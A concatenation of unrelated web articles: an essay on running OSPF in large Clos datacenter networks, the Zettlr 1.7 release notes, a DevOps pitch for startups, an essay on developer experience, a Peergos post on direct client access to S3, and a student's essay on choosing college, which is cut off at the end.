more needs to be done to help prevent any major job losses. The ending of the furlough scheme should perhaps be reconsidered to avoid any major economic damage in the long term.&nbsp;</p>

	<h4>The wisdom is that BGP is the only Datacenter protocol, but is it? Do we know?</h4>

          <p>I worked at Amazon for 17 years as a network engineer. Now I’m out of Amazon and looking at the industry, I’m learning new things. <strong>One of the things I’ve learned recently is that OSPF shouldn’t be used for Clos leaf-spine networks because of scale.</strong> I’ve heard that it can’t keep up with the size and scale of the modern datacenter networks. <a href="https://www.juniper.net/documentation/en_US/release-independent/solutions/topics/task/configuration/ip-fabric-underlay-cloud-dc-configuring.html">Juniper IP Fabric Underlay Network Design and Implementation</a> is an example of the recommendation.  <a href="https://tools.ietf.org/html/rfc7938">https://tools.ietf.org/html/rfc7938</a> is what as used as the reference for using eBGP to be the routing protocol inside of large Clos networks.</p>

<p><strong>This is a shock to me</strong> since we built large OSPF Clos networks a decade ago. We built networks this way with hundreds of routers (even thousands) speaking OSPF. I’m not saying it is easy or that we didn’t have to understand OSPF well; If you don’t design it well, you get a flooding disaster. But if you do set it up right, it works really well. It converges quickly and doesn’t collapse under failure. The key thing is to be sure you understand how flooding works and you focus on areas and summarization. There are different things you have to be aware of when you are designing a Clos network with BGP vs OSPF. With BGP you have to be figure out how to mitigate path hunting. With OSPF need to work on how to avoid congestion collapse.</p>

<p>There is also work on building new protocols for these large Clos or Clos-like networks, such as <a href="https://datatracker.ietf.org/wg/rift/documents/">https://datatracker.ietf.org/wg/rift/documents/</a>. I don’t understand why OSPF or ISIS isn’t good enough so I don’t understand why these are necessary. There <a href="https://pc.nanog.org/static/published/meetings/NANOG74/1763/20181003_Martin_Routing_In_Dense_v1.pdf">are some good ideas in RIFT</a>, I’m just haven’t seen a reason to use it.</p>

<p>When we did this we were using CPUs from 2003 and we were using a lesser known OSPF stack. It’s OSPF implementation was okay, but we were strongly warned away from using their BGP implementation by the developers. <strong>We had to understand and mitigate risk</strong>. We had to test it as well as we could and be very careful in our first deployments. The stack had never been battle tested like this before. We still ran into some scary performance issues but got to work with great software engineers on the protocol stack to work through problems and figure out our scale.</p>

<p>Others agree with me, <a href="https://www.youtube.com/watch?v=Qmvg2mnbcPg">https://www.youtube.com/watch?v=Qmvg2mnbcPg</a>, even though they are mostly focusing on smaller networks than I was working on. But either way, OSPF can be made to work just fine on very large (or small) Clos networks.</p>

<p>As an example of the scale, this is a generic 24 port 3-tier Clos. It is possible to make OSPF work on this. This is smaller than what we were working on in 2012.
<img src="https://elegantnetwork.github.io/assets/images/24port-3tier-clos-resize.png" alt="24 port 3-tier clos"></p>

<p>To understand and then mitigate the risks an unknown OSPF stack, at scale, is why I started building a configuration management system and started <a href="https://elegantnetwork.github.io/posts/Network-Validation-with-Vagrant/">simulating our network design</a>. We needed to understand how any OSPF protocol stack would work. Could we make the protocol scale at all? We needed to see what would actually happen with a real OSPF implementation. <strong>I cannot stress enough how important this simulation was.</strong> We did not understand the problem of flooding and we did not understand the solution until we had tried it out in simulation.</p>

<p>Before that, though, we spent a lot of time on white boards arguing about topology and OSPF. <strong>I think whiteboards are the most important tool for network design</strong> currently available, which makes me sad. I wish that wasn’t true, I want much better tools. I can’t even tell you the number of disasters averted by 2-3 great network engineers arguing over a whiteboard. This works really well, but there are important reasons it’s not good enough. One is that for many of these discussions, it’s extremely hard to get data to make the decisions. In this case, a comparison of convergence time and failure detection in a 3-tier Clos with eBGP, iBGP, and OSPF should be required, but we didn’t have that capability.</p>

<p>In a dense mesh-like network such as a Clos network, the concerns around OSPF swirled around four main issues: the effect of flooding, the size of the link state database, the speed of SPF calculations, and the ability for OSPF to carry a large number of prefixes. We were concerned about OSPF scaling w.r.t. its flooding and it’s the flooding that is expensive with a Link State Database protocol, not the Shortest Path First (SPF) calculations. Which means you have to be very careful about what is flooded, what are the areas, and how things are summarized. I didn’t understand this until I had a simulation and I could try things out with areas or without, and the effect was dramatic. I think it’s often true that there is a part of a design that you don’t understand, which is one of the big reasons to do simulation. We didn’t have the ability to lab up a network as big as we were going to be building, so the simulation was critical. I can’t even imagine what we would have done without it. Based on the simulation, we created targeted tests for real hardware to understand how it would deal with the scale.</p>

<p>The point of this article is not that OSPF is better than BGP, but that it does work in very large size Clos networks. I’m frustrated that so much of the industry went a direction without great data or analysis, just following one set of opinions and design choices. <strong>I wish there were easy ways for people to be able to design, simulate and test different designs</strong> like this so that they could decide for themselves the tradeoffs they’d like to make, rather than have to rely on some type of industry hype. There needs to be a better way to be able to describe topologies and designs so that it’s really easy to try out different ideas.</p>

<p>If you have other considerations, such as you want to run IPv6, or EVPN, a single instance of eBGP such as the one popularized by the open source routing suite, FRR, maybe the simplest or elegant. But with proper design, scale is not the reason to use BGP over OSPF. If you are running a small Clos network and don’t have IPv6 or EVPN, OSPF is more straightforward and generally faster, as was the common practice before the advent of BGP in the data center.</p>

<p>No matter what, you need to understand the choices that you are making and understand the tradeoffs. This is hard to do, and especially hard in networking because we lack design patterns and good tools to help us understand the implications of our choices.</p>

<p>If anybody knows about tools or design patterns or even somebody who’s actually compared OSPF vs BGP in Clos networks with data, I’d love to hear about it.</p>

    <blockquote>
<p>But Zettlr 1.6 not only breaks the record in beta releases, but also in terms of Changelog length. The list is even longer than the list of changes we introduced in 1.5, so let’s quickly go through some of the most exciting news!</p>
</blockquote>
<p>Remember when we wrote these lines <a href="https://zettlr.com/post/zettlr-160-released">back in March</a>, when 1.6 was released? We just copied that statement over, because exactly the same holds true for 1.7.</p>
<p>What a ride that was. When we announced the work on 1.7, which would include a full rewrite of the underlying file system abstraction (the ominous FSAL you might’ve seen us mentioning occasionally) we expected to manage that, but not much else. And, what can we say? The changelog for 1.7 once again breaks all previous records of length! Apart from some necessary internal stuff that you won’t really see, a lot of visual changes have made their way into the app.</p>
<p>So while this announcement cannot even begin to try to include all the changes, what we’ll instead try to do is announce the more general changes that you can expect for this version. So let’s go!</p>
<blockquote>
<p>If you want to start the download of the app while reading this, <a href="https://www.zettlr.com/download">click here</a>!</p>
</blockquote>
<h2>The new FSAL</h2>
<p>Let’s begin with the obvious hidden stuff. The main aim of 1.7 was a rewrite of the file system, which sat at the core of the app for the past three years, and which was completely based off a StackOverflow-answer (probably <a href="https://stackoverflow.com/a/16684530">this one</a>), as so many things in modern software applications. Why was this rewrite necessary? Well, it would’ve worked fine for the next iterations, so much is sure. But it wasn’t scalable. What “scalability” always refers to is the ability of an application to receive new features with ease. An un-scalable software therefore makes it much harder to add new features. Zettlr hit such an impasse in the past year, and as the ability to load files into the application is a core feature of Zettlr, having this central thing not being scalable was simply not an option.</p>
<p>What the changes bring for you is visible when you first start 1.7. We were already able to use the rewritten logic to implement quite some new cool features that were long planned.</p>
<p>The new FSAL allowed us to implemented more than one opened file — you can now open more documents in tabs and quickly switch between them using shortcuts. Additionally, the overall file management is much easier, and the app should start even faster than previously, because we also added caching to the app. Our internal tests show that this reduces the start up time for the app by up to 95 % once the cache has been filled. The first start will in fact be slower than each start of 1.6, but after that you will certainly notice the increase in speed, especially on computers with less computing power.</p>
<h2>Polyglot Syntax Highlighting and Improvements to the Editor</h2>
<p>Something else that has managed to sneak into 1.7 is quite a host of new languages for which syntax highlighting is now enabled. While we are not sure what prompted this unusual high frequency of requests for new syntax highlighting languages, the app now features the astonishing amount of <del>39</del> 40 languages (one late-comer was added just yesterday) for syntax highlighting!</p>
<p>Apart from this rather niche feature, we had the ability to spend a lot of time with the editor itself. Because we had to re-arrange how some things work due to the ability of opening multiple documents simultaneously, we used the opportunity to stuff a lot of improvements into the rendering modules, the shortcuts and the display modes.</p>
<h2>A new User Experience</h2>
<p>But changes were not confined to the editor instance. The whole rest of the user interface received a face lift as well. Context menus have been fixed in a lot of places (for instance, you finally have a context menu on directories in the file list!), we have exchanged almost all icons with much better looking ones, and many UX elements have received some special attention to make them fit much smoother into your day-to-day writing experience.</p>
<p>This also includes a new theme — Bordeaux —, which was envisioned by <a href="https://arthurperret.fr/">Arthur Perret</a> and generously donated to Zettlr. It features a lot of elements that have been inspired by sound typographic thoughts and <a href="https://edwardtufte.github.io/tufte-css/">Tufte CSS</a>. The other themes have also received some updates, and you will notice that the dialogs now also respect the dark mode setting, making them less stressful on the eyes in extremely dark environments (always remember to turn on a bright lamp in the dark in either case! ;)</p>
<p>And for the new users among the Zettlr community, there’s also good news: We finally managed to integrate <a href="https://twitter.com/zettlr/status/1275497720741072897">a first start guide for the new adepts of Zettlr</a>!</p>
<p><strong>Attention</strong>: There are also some breaking changes in the application, so if you’ve used previous versions of Zettlr, prepare to change your muscle memory a little bit!</p>
<ol>
<li>The shortcuts <code>Cmd/Ctrl+[0-9]</code> no longer open recent files, but will focus the corresponding tab (0 = tab no. 10)</li>
<li><code>Cmd/Ctrl+W</code> will now attempt to close tabs before closing the window. To close the window immediately, use <code>Cmd/Ctrl+Shift+W</code>.</li>
<li>We have switched the shortcut for all actions on the editor window such as following links, starting searches, or editing footnotes from <code>Option/Alt</code> to <code>Cmd/Ctrl</code>!</li>
</ol>
<h2>A new Homepage and some Wallpapers</h2>
<p>Somewhat unrelated to the app: Because working on the app is not enough, we managed to perform a small relaunch of the website, which now looks more modern and we finally got rid of the boilerplate template. Feel free to look around!</p>
<p>And if you want to give your computer the Zettlr-feeling even if the app is not running, we have made available some of our video backdrops and transition-cards as well as some specifically designed 4k-wallpapers <a href="https://zettlr.com/media/wallpapers">available on a new page</a>!</p>
<h2>Smaller Changes</h2>
<p>As we mentioned previously, the changes do not stop here. The Table Editor has received many updates, vim and emacs insertion modes have been implemented for the few experts that know how to use these systems, the support for non-western languages (especially those written in RTL direction) has been heavily improved, as well as the dragging and dropping of files, links, images — albeit we were unable to include a fix for <a href="https://upload.wikimedia.org/wikipedia/commons/a/aa/Cat_keyboard.jpg">your cat dropping itself onto your keyboard</a>.</p>
<p>Additionally, finally the long-awaited fixes to the library loading arrive, the editor is much more robust towards unexpected user behavior (while writing this, we realized that this sounds way more rude than anticipated) and handles more situations better.</p>
<p>All in all, Zettlr 1.7 is a surprisingly heavy update, and really makes up for the wait time of four months. We hope that this update increases your productivity yet again and will spark joy on your desk! In the meantime, we’ll treat ourselves with some direly needed vacation and would like to wish you all the best for the upcoming holidays in July!</p>
<p>Stay sharp everyone!</p>

                            </p>
                                  <p dir="ltr"><span>Managing a tech startup has its own challenges. And although we have come a long way ahead, every new solution seems to build a new problem. Just take a moment and recall. In the early, 2000’s building complex applications was not everyone’s piece of cake, and hence the microservice architecture started becoming popular. But, with time, it became difficult to deploy these small services of the same application in different environments, especially as the companies started becoming serverless</span><span>&nbsp;with the introduction of cloud computing. Thus,</span><span>&nbsp;Docker&nbsp;</span><span>was built. Everything seemed well, but then came the problem of managing these large numbers of containers and so container orchestration tools like Kubernetes</span><span>&nbsp;started becoming popular.</span></p>    <h2 dir="ltr"><span>Every Technology Has Its Baggage</span></h2>    <p dir="ltr"><span>Today the problem is not just technical. With&nbsp;</span><span>continuous integration &amp; continuous delivery</span><span>&nbsp;becoming the key focus as companies try to beat competitors to market, fast deployment is not just a perk, but a necessity for young startups</span><span>&nbsp;to survive. &nbsp;Faster deployment not only saves money, but even history teaches us that the first to launch has the first influence on the customers (Just look at how Netflix changed the streaming industry .)</span></p>    <p dir="ltr"><span>Although the software tools like Version Control Systems and Virtual Environments have helped organize production, since the adoption of the cloud-based microservice architecture, the deployment procedure has changed a lot. It is no longer new to see applications pass tests in production and later crash in deployment. Techniques like</span><span>&nbsp;IAAC</span><span>( Infrastructure As A Code ) have helped document the infrastructure and keep them in sync with the production environment. However, it still throws light on a lot of areas of improvement, like increased testing times and the big data logs that have to be gone through.&nbsp;</span></p>    <p dir="ltr"><span>Now we are at a point where software alone cannot speed up deployment. The whole system has to change! Though luckily we have the solution:&nbsp;</span><span>DevOps</span><span>.</span></p>  <h2 dir="ltr"><span>How does DevOps help you?</span></h2>   <p dir="ltr"><span>The traditional approach to streamlining the production of an application can be broken into two parts: Development and Operation.&nbsp;</span></p>    <p dir="ltr"><span>The development includes development, testing, and bug fixes, and although they are categorized as one unit, in most companies the developers and testers generally have a communication barrier that leads to more time in finding and fixing bugs.&nbsp;</span></p>    <p dir="ltr"><span>When the application is finally approved for deployment, the operations team is responsible for containerizing individual microservices</span><span>&nbsp;and deploying them on the servers. &nbsp;But most startups are serverless these days and their services are hosted on the cloud. Maintaining the cloud infrastructure is in itself a time-taking task, and the constant changes in the development phase result in an increase in the time to market.</span></p>    <p dir="ltr"><span>This is because Cloud servers have added a lot of tasks to the operations team. Managing incoming traffic to match the number of servers required (because now you are paying by the hour), going through logs of crashes, and reporting these issues to the development are necessary tasks.</span></p>    <p dir="ltr"><span>Most problems that are faced in this process are generally due to a lack of communication and data transfer. Either the development team is not completely aware of the production environment, or the logs of the crashes and test results are not reported on time.You will also notice that a lot of time and money can be saved by automating certain processes, like automatically increasing the server base when traffic is expected to be high.</span></p>    <p dir="ltr"><span>DevOps is neither a software stack nor is it some additional hardware for your server. Instead DevOps</span><span>&nbsp;is a set of practices and an interdependent organization structure that is aimed to target several problems that most tech startups face, by bringing the Dev and the Ops team together.&nbsp;</span></p>    <p dir="ltr"><span>These problems are:</span></p>  <ul> 	<li><span>Increasing deployment frequency.</span></li> 	<li><span>Reduce crashes in the deployment phase.</span></li> 	<li><span>No infrastructure to automate testing.&nbsp;</span></li> 	<li><span>Faster bug discovery and fixes.</span></li> </ul>    <blockquote>  	<p dir="ltr"><span>In short DevOps</span><span>&nbsp;aims at better and faster production at a cheaper price. Now which startup would not want that?</span></p> </blockquote>    <p dir="ltr"><span>Some number's on how ROI is measured in adopting DevOps :</span></p>    <p><img src="https://s3.ap-south-1.amazonaws.com/squareops.com/img/state-of-devops-report-2019-insights.jpg"></p>   <h3 dir="ltr"><span>The DevOps Culture</span></h3>    <p dir="ltr"><span>Large companies, like Google, Amazon, and Netflix, were the early adopters of the&nbsp;</span><span>DevOps culture.</span><span>&nbsp;Although it isn’t common to see these large scale companies adopting new practices, because they have always been the market disruptors, it was when the stats were compared before and after the establishment of an in-house DevOps</span><span>team that the benefits became evident.</span></p>   <blockquote> <p dir="ltr"><span>A great example of a radical change due to DevOps is</span><span><b>&nbsp; Target.</b></span></p> </blockquote>    <p dir="ltr"><span>After it’s data breach in 2013, Target was forced to rethink its company structure as the data exposed a complex development and organizational structure. It was so inefficient that in a recent interview with the Wall Street Journal, Heather Mickman, a director at Target, revealed that the situation was so bad that just to get one server provisioned it would take ten teams!&nbsp;</span></p>    <p dir="ltr"><span>Starting with changes in leadership, by the end of 2015, Target had completely transitioned to an organization based around the infrastructure of the products. Every unit of the engineering team now had API access to other teams to monitor logs and environment setups. This setup also had an automated testing and deployment environment. All this resulted in a steady increase in revenue with the annual revenue being $70.27 billion in 2016 to $78.11 billion in 2019 (an all-time high) according to&nbsp;</span><a href="https://www.statista.com/statistics/255957/revenue-of-target-in-north-america/"><span>statista.com</span></a><span>.&nbsp;</span></p>    <h3 dir="ltr"><span>The Ending Note</span></h3>    <p dir="ltr"><span>Today, it is advised that startups</span><span>&nbsp;adopt DevOps</span><span>&nbsp;practices from the day of their establishment because it is essential to become used to&nbsp;</span><span>continuous integration &amp; continuous delivery</span><span>&nbsp;to convert clients to customers.&nbsp;</span></p>    <blockquote>  	<p dir="ltr"><span>Moreover, if the startup is just too young to afford an in-house DevOps&nbsp;</span><span>unit, outsourcing to a third-party DevOps</span><span>&nbsp;could be the solution. This saves time and effort on R&amp;D and also the economic costs of implementing any infrastructure. At the same time, it helps the organization adopt effective practices that have already been tested by the provider on a large scale due to their years of experience in the field.</span></p> </blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="sapper"> <div>  <main> <div>  <h2 id="postSubtitle">The Importance of Developer Experience off the Happy Path</h2> <p>We need to have some real talk around what we are calling Developer Experience (DX) at developer-focused companies.</p> <p>It's not well defined, although <a href="https://css-tricks.com/what-is-developer-experience-dx/">Chris Coyier has done a good survey</a> of what people think of when they hear the term.</p> <p>Here are some things that companies traditionally think of when they "work on DX":</p> <ul> <li><strong>Replacing many with few</strong>: Replacing many lines of code with few lines of code. Replacing many logos with one logo. Replacing many steps with one click (signup, deploy). <a href="https://www.swyx.io/writing/write-my-code-for-me/">Generating code</a> so you don't have to handwrite it. Providing great value and plenty of functionality as a first-party, out of the box, or with zero config.</li> <li><strong>Extensive Documentation</strong>: Getting Started. Example Demos. Interactive Examples. Full API Docs. Guides and Recipes. Good Search. Versioning. (appropriate to <a href="https://www.swyx.io/writing/documentation-levels/">project maturity</a>)</li> <li><strong>More tooling</strong>: CLIs, Editor Extensions, Code Snippets, Playgrounds, Language Servers.</li> </ul> <p>I'm not at all saying these things aren't important. They're even hard to do well, and fully deserve specialists in their own right. These foundational pieces of developer experience should also be <em>fast</em> and intuitive to the point of <a href="https://johno.com/guessable">guessable</a>.</p> <p>But I'm also saying that developers, when they use our products, experience <em>many</em> other things which aren't traditionally the domain of "DX people":</p> <ul> <li><strong>Downtime</strong>: When your service goes down, does your status page lie? Do you post prompt, no-bullshit <a href="https://github.com/danluu/post-mortems">post-mortems</a>? Do you provide good fallback options for when your service is down? Do you practice disaster recovery?</li> <li><strong>Response times</strong>: Are you not just meeting your SLAs, but actually clearly answering customer questions? What are you doing for users not yet covered by SLAs? For your open source footprint, do users have confidence that their issues will be addressed and appropriate PRs reviewed, or are you asking people to do free work for you that you then ignore?</li> <li><strong>Missing/Incomplete Features</strong>: No product launches feature complete. Nobody expects you to. <strong>The true test is whether you address it up front or hide it like a dirty secret.</strong> As developers explore your offering, they will find things they want, that you don't have, and will tell you about it. How long do you make developers dig to find known holes in your product? Do developers have confidence you will ship or reject these features promptly, or are they for a "v2" that will never come?</li> <li><strong>Uncertainty over roadmap</strong>: Do your most avid users know what's coming so they can plan around your plan? If that's too high a bar, do your <em>own employees</em> know what's coming so they can coordinate nicely? Do you have "perma-beta" products? How do you communicate when users ask if they should use "orphan" products? (don't be ashamed, everyone has them)</li> <li><strong>Uncertainty over costs</strong>: Is your pricing predictable or do your users need a spreadsheet to figure out what you are going to charge them? If charges are unexpectedly high, can developers use your software to figure out why or do they have to beg for help? Are good defaults in place to get advance warning? Have your employees ever paid for your own product (or had to justify doing so to their own employers)?</li> <li><strong>Deprecation/Lock-in/Portability</strong>: Do you <a href="https://medium.com/@steve.yegge/dear-google-cloud-your-deprecation-policy-is-killing-you-ee7525dc05dc">constantly deprecate APIs and products</a>, causing additional work for no gain? Some amount of lock-in is unavoidable, but are you conscious of how much proprietary API you are foisting on your user? Should your user want to leave someday for whatever reason, have you documented that and made that easy, or are they on their own?</li> <li><strong>Debugging</strong>: Are your errors informative or scary? Have you designed them to be searchable or do they only make sense to maintainers? When things go wrong, how quickly does your service surface common issues and offer resolution steps? What about enabling users to answer <a href="https://www.swyx.io/writing/frontend-observability/">questions they don't yet know they have</a>? If developers are constantly making mistakes and "<a href="https://www.engadget.com/2010-06-24-apple-responds-over-iphone-4-reception-issues-youre-holding-th.html">holding the phone wrong</a>", is it their fault or yours?</li> <li><strong>Audit Logs &amp; Access Control</strong>: Many products start life in single-player mode, and then execute a very clumsy transition to multi-player when they start serving teams and enterprise. When something that shouldn't have been done has been done, do you offer trustworthy sources of truth, and ways to prevent repeats (or, of course, make them impossible in the first place)?</li> </ul> <p>Of course, none of these are new problems, and well known to product management. The problem is mostly organizational - as "developer advocacy" as a discipline evolved from "developer evangelism" (going from a "1 way street" to a "2 way street"), it is now evolving to "developer experience". I see a troubling organizational limitation of DX folks, defining DX to the stuff that focuses on increasing "top of funnel" growth (reducing friction, growing awareness, an endless parade of copycat short term growth hacks) - and having comparatively a lot less impact on the "bottom of funnel" stuff (logo churn, satisfaction scores, account expansion/customer success). <strong>There's little sense making more rain when faced with a leaky bucket</strong>.</p> <p>Conway's Law is an <a href="https://www.swyx.io/writing/eponymous-laws/">eponymous law</a> that states that "organizations design systems that mirror their own communication structure". Steven Sinofsky's snappier definition is "<a href="https://medium.com/@donorem/shipping-the-org-chart-3319181be9bd">don't ship your org chart</a>". We need to be careful about the consequences of letting Conway's Law apply to Developer Experience.</p> <p>To be clear, I don't really know how to do this yet. I am just thinking out loud. But my intuition is that in order to design exceptional developer experiences, we should pay more attention to developer exceptions. As DX people, we've focused a lot on <code>try</code>, perhaps we should take a good look at <code>catch</code>.</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/13cnr8kxxl9i57ouuh4h.png"> </p> <p>The first thing to fix is organizational incentives. DX work must not just feel welcome, it must be demanded and good results rewarded. Nobody wants to feel like they are adding weight onto an already overloaded backlog. Most orgs are set up in a way that lack of feedback isn't noticed when it isn't given, and feedback when given feels like additional burden. This is, unsurprisingly, not conducive to feedback.</p> <p>The second thing is to establish invariants around your core developer experience and automate monitoring and reporting of these to the fullest extent possible. <a href="https://twitter.com/sebmarkbage/status/1063585097545220096">Tools that hold the line are incredibly powerful</a>. To progress, you need to first stop regressing.</p> <p>My last thought is around helping PMs and EMs create DX, rather than taking primary responsibility. If you're sending in PRs and design docs yourself, you are probably doing too much of someone else's job and will be ineffective and/or resented. Better to provide them the information they need to make decisions and be available for opinions and instant feedback since you represent the end user. It is common for there to be an infinite list of small things to do - and that is very hard to sell internally - so how can you bundle these up into thematic projects, motivate engineers, and carefully communicate progress to the wider world?</p> <p>It's time we look beyond the easy questions in developer experience, and start addressing the uncomfortable ones.</p> <blockquote> <p>Note: This is my own thinking sparked by a third party conversation, and I am not speaking on behalf of my current employer.</p> </blockquote> <hr>  </div> </main>  </div></div></div>]]>

    <p>Peergos uses IPFS to store its data and IPFS supports several kinds of blockstores, from various kinds of local disk based storage to an S3 based store. The S3 store is useful because it automatically provides redundancy and availability, and can also hold much more data than any disk. There are also many providers of S3 compatible storage now. For a while now, we've supported using the S3 based blockstore in Peergos. However this wasn't visible to end users, it was only a server side thing. This means that when uploading or downloading data it all had to go through the Peergos server.</p>

<br>
The flow of data in previous S3 usage, which proxied through the Peergos server
</center>
<p>We have now implemented direct S3 access for reads and writes from the browser/client. Clients can read and write directly to an S3 bucket after authorization from the Peergos server. This new feature makes the Peergos server much more scalable and reliable. The typical bandwidth required of the Peergos server is reduced by ~100x.</p>
<p>There are two modes of read operation; public and authorised. In public mode, all encrypted blocks can be read directly from S3 without any permission. This is the fastest, but may not suit your pricing model for S3. In authorised mode every read request has to first get permission from the peergos server, which signs a url that is temporarily authorised to read that object from S3. The client then directly downloads the block from S3. This is illustrated below. </p>

<p>This is all very well, but what about writes? What if there are many users on the same server? This is where it starts to get beautiful... All users on the same Peergos server share the same S3 bucket, and yet there is no possibility for conflict! This is because the blocks in S3 are content addressed! When a client wants to upload a block they first pre-authorise the block hash with the peergos server which returns a signed url the client can use to upload directly to S3. Upon upload, S3 automatically checks the sha256 hash and size of the block with what was signed. The data flow is shown below.</p>
<center>

</center>
<p>It should be clear how this takes most of the load off of the Peergos server, thus allowing a single server to handle many more users. </p>
<p>The kind of functionality required for this isn't actually exposed by the official S3 SDK. So to get this working we had to implement our own version of the S3 client. It's remarkably simple and only took us a single class, without any dependencies except an hmac-sha256 implementation. The added benefit of this is that we've been able to remove the amazon S3 sdk entirely from our codebase, which was 60mb of dependencies! Compare this with the rest of Peergos including all dependencies, which add up to only 16mb. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-37b97e2792cec9751559"><div><p><em>Before we start I want to note that these are my thoughts and what I think is right. I may be wrong and if I am I’d love for</em><a href="https://www.juandavidcampolargo.com/contact" target="_blank"> you to prove me wrong.&nbsp;</a></p><p>Lots of smart people have written about why you shouldn't go to college. But I'm giving it a shot.</p><p>Yeah, you read that right. I’m going to college despite the argument of many people of why people shouldn’t go to college.&nbsp;</p><p>I want to study engineering because I want to get the foundation of specialization in a method of thinking. I want to have one strong foundational skill that I can build on.</p><p>Many say college isn't worth it. And I want to add perspective to this debate as an entrepreneur, immigrant, and optimist.&nbsp;</p><p>Richard Hamming said once, “If you do not work on an important problem, it’s unlikely you’ll do important work.” Hamming gave a talk titled You and Your Research, which has made me think about my decisions and future projects, especially for solving <strong>important problems.&nbsp;</strong></p><p>The most important problems will require a more technical background and solid foundation where a combination of inspiration and a strong foundation will be key.&nbsp;</p><p>I asked Patrick Collision, one of the youngest billionaires and founders of Stripe, about what he thought about college. He said that teenagers like me (17) should keep learning for about 5 or 7 years before they commit to a plan of action of starting a venture. Learning does not mean college, it means going in-depth in your field of study to see the opportunities only an expert would identify.&nbsp;</p><p>I fell into the trap of starting and committing to ideas too early when I didn’t have the foundations. For instance, I wanted to create an app to translate Google Docs into other formats across the web. I needed to learn like 4 programming languages, API, authentication, and the list goes on. That just wasn’t viable, not impossible. I still want to do it and I’m learning to make it happen, but it’s an example of how you can fall into that trap.&nbsp; <strong>Exactly what Collison said </strong>about starting too early.</p><p>Hold on a second.<br></p><p>Why would Patrick say this? Didn’t he drop out of college not once, but twice? I couldn’t resist challenging him and asked, Don’t you see the contradiction here, why would he advise us the opposite of what he did?&nbsp;</p><p>He laughed and said that in certain fields the knowledge required is deeper, more specialized, and needs more study time and commitment. The learning curve is just too steep. He said we should be wary of starting too early, depending on the type of innovation we want to get involved in.&nbsp;</p><p>He also said that software forgives youngsters as you can get good at it by working and creating apps, websites, or programs. Patrick gave the example of how if he wanted to start a biotech company, he really couldn’t because of how much he’d need to learn.&nbsp;</p><p>Patrick makes a good point. But he forgot to say something he did. The two times he went to college, he was always working on projects. For me, going to college means I will learn and work on projects.&nbsp;</p><p>I will learn and create things. Hopefully, these ventures don’t take off because I won’t think twice [1].&nbsp; I shouldn’t try to choose between college &amp; working on projects but choose both. College and my projects should be related, and I should use college to leverage my projects and endeavors.&nbsp;</p><p>In college I plan on creating startups, working with professors on research, commercializing findings, creating patents, products, and anything that comes my way. The opportunities are limitless and I plan to find and take advantage of the opportunities that I can <strong>only find at college </strong>[2]<strong>.&nbsp;</strong></p><p>A big motivation for people going to college is “networking.” Is meeting people important? Sure yeah, but do you remember the time we’re living? We can meet anyone by clicking a button.&nbsp;</p><p>The networking thing isn’t solid enough and lacks independent thinking. <strong>Hello? </strong>We have LinkedIn and Twitter and whatever else. Others say they found valuable friendships and learned how to socialize with others. Sure? I don’t even know what to say about this. Perhaps it’s because I read <em>How to Win Friends and Influence People.</em> Just kidding (mostly).</p><p>College networking is more transformational than just meeting people. The connection is far different when you work and live with these people for four years, especially because of the intimate and emotional experiences with them. The emergencies, all-nighters to study for exams, parties, volunteering, heartbreaks, etc. They don’t happen online. They only happen in person, and usually in college.&nbsp;</p><p>You can be holed up working on projects and hustling, you can party and not care about grades, or you can have the best of both worlds.</p><p>There are other places where you can find these opportunities to meet people and learn how to talk to people such as working on a job, starting a company, going to events, and putting yourself out there. Sure, but not in a collegiate environment [3].</p><h2>The Engineer Entrepreneur&nbsp;</h2><p>Look, I’m going to college to learn something hard such as engineering and science. Something I can mostly only do there.&nbsp;</p><p>If I study engineering, I could come back and learn pretty much anything else. If I study soft sciences, I can’t really come back and study engineering. I also know that the best way to really learn engineering is to engineer stuff via building, and not necessarily in college.&nbsp;</p><p>I’m aware I may not like engineering, or perhaps I will change to study something else. We’ll see. I’m probably not going to be the “best engineer.” And that is OK! I probably don’t want to be the best engineer, it’s too hard and too risky. I intend to become a “<a href="https://pmarchive.com/guide_to_career_planning_part2.html#:~:text=Seek%20to%20be%20a%20double%2Ftriple%2Fquadruple%20threat." target="_blank">double, triple, or quadruple threat</a>.”&nbsp;</p><p>Scott Adams says there are mostly two paths to a remarkable life. He advises:</p><blockquote><p>If you want an average successful life, it doesn’t take much planning. Just stay out of trouble, go to school, and apply for jobs you might like. But if you want something extraordinary, you have two paths:</p><p>1. Become the best at one specific thing.</p><p>2. Become very good (top 25%) at two or more things.</p></blockquote><p>That’s what I intend to do.&nbsp; A good example of complementing skills is Patrick Collison who combines coding, leadership, and business. He’s a great coder but probably not the best in the world. The same with leadership and business. When you combine these skills that are rarely found together, you get someone like Patrick Collison.&nbsp;</p><p>I already have the entrepreneurial mindset for ideas and adaptability.&nbsp;</p><p>I've been a person who started businesses and selling things since I was a little kid. I’d sell <a href="https://collectibles.paniniamerica.net/store/col_usa_en" target="_blank">Panini World Cup</a> stickers at school to my friends. Sometimes I wouldn’t even finish my album because I’d sold so many of the stickers. I’d sell cheese to companies, friends, my mom’s clients, anywhere, or anyone. That's how I was.&nbsp;</p><p>I was an entrepreneur before the word entrepreneur became buzzy. I didn’t even know the word because I knew no English.&nbsp;</p><p>Then, when I moved to the U.S. at 13, I started more companies, including a digital marketing agency. I was always doing. I was always learning (<a href="http://juandavidcampolargo.com/blog/highschool" target="_blank">Read my Journey through High School</a>).</p><p>Some skills I’m improving are public speaking, writing, speaking different languages, finance and economics, big picture-oriented, international leadership, and boldness.&nbsp;</p><p>I’m more like Andrew Carnegie and Cyrus McCormick category who commercialize and innovate with technology, and not necessarily invent the technologies. Although I want to be more of an entrepreneur than a technologist, it will be extremely useful to get a solid background and put the effort to do so.&nbsp;</p><p>In the era of <a href="https://www.juandavidcampolargo.com/blog/leverage" target="_blank">leverage</a>, we don’t need credentials, money, or distribution. As long as you solve a problem people care about, you can get started at any age, come from any field or country, need little or no money. Just start and use free distribution channels like social media to reach people.&nbsp;</p><p>A <a href="https://www.adamtank.com/" target="_blank">friend</a> pointed out an interesting point. He said that you don't need a degree (including engineering) to change how society functions or build something yourself. But you do need a degree if you want to work within what society has built, because the structure requires it.<br></p><p><strong>I want to work within what society has built to positively change how society functions.&nbsp;</strong></p><p>Engineering and science are fascinating and being able to use them to create and build things is my <strong>dream. </strong>Not only build but also research. I look up to people like Pasteur who engaged in research and engineering inventions. I’m as passionate for fundamental science questions as I am for innovating with technology.&nbsp;</p><h2>Should <strong>You 